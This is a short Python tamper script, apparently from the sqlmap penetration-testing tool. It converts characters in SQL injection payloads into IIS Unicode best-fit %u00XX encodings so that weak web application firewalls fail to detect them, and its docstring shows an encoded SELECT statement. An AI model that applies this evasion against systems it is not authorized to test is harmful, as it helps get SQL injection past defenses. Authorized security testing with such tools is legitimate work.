#!/usr/bin/env python

"""
Copyright (c) 2015 @xiaoL (http://xlixli.net/)
"""

import os
import string

from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage

__priority__ = PRIORITY.LOWEST


def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against WAF on IIS")


def tamper(payload, **kwargs):
    """
    IIS Unicode-url-encodes
    WideChar To MultiByte bypass weak web application firewalls

    Requirement:
        * IIS

    Tested against:
        * WAF

    Reference:
        * http://blog.sina.com.cn/s/blog_85e506df0102vo9s.html
    Notes:
        * Useful to bypass weak web application firewalls

    tamper('SELECT FIELD%20FROM TABLE')
        'S%u00F0L%u00F0C%u00DE FI%u00F0L%u00D0%20FR%u00BAM %u00DE%u00AABL%u00F0'
    """

    change_char = {'1': 'B9', '2': 'B2', '3': 'B3', 'D': 'D0',
                   'T': 'DE', 'Y': 'DD', 'a': 'AA', 'e': 'F0',
                   'o': 'BA', 't': 'FE', 'y': 'FD', '|': 'A6',
                   'd': 'D0', 'A': 'AA', 'E': 'F0', 'O': 'BA'}

    ret_val = payload

    if payload:
        ret_val = ""
        i = 0
        while i < len(payload):
            if payload[i] in change_char.keys():
                ret_val += "%%u00%s" % change_char.get(payload[i])
            else:
                ret_val += payload[i]
            i += 1

    return ret_val
